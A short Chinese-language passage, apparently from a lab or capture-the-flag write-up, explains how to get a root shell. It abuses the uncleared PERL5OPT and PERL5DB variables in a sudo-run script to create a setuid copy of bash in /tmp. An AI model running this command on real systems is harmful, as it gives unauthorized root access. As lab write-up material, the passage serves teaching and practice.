    Shell as root

    脚本设置了环境变量，很难劫持，另外发现一个 xml_pp，发现时 perl 脚本

    • 可以利用漏洞

    大致原理就是，当启动 Perl 脚本时，会先加载执行 PERL5OPT 变量内容，刚好此变量没有被脚本清除

    • sudo PERL5OPT=-d PERL5DB='exec "cp /bin/bash /tmp/shell;chmod +s /tmp/shell"' /opt/monitor.sh
